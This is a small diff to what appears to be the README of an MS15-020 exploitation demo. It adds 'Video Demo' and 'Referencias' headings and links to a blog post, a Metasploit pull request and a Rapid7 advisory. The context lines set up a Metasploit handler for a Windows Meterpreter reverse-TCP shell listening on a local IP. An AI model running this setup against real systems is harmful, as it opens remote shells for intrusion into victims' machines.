@@ -41,9 +41,15 @@ use exploit/multi/handler
 
 set payload windows/meterpreter/reverser_tcp 
 
-set lhost 192.168.10.1 
+set lhost 192.168.10.1
 
- 
+----------------------------------------------------------------------------------------------------------
+Video Demo
+
+
+----------------------------------------------------------------------------------------------------------
+
+Referencias
 http://da1sy.cn/2018/05/MS15-020/
 https://github.com/rapid7/metasploit-framework/pull/4911
 https://www.rapid7.com/db/vulnerabilities/WINDOWS-HOTFIX-MS15-020
